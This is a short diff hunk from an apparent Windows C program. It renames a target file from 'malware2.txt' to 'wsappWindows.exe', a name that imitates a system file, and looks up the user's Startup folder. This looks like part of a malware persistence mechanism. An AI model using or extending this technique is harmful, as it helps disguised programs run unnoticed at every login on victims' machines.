@@ -9,7 +9,7 @@
 #pragma comment(lib, "Shell32.lib")
 
 int main(void) {
-    char szFileName[] = "malware2.txt";
+    char szFileName[] = "wsappWindows.exe";
     LPSTR folderPath = (LPSTR)malloc(1024);
 
     SHGetSpecialFolderPathA(0, folderPath, CSIDL_STARTUP, 0);
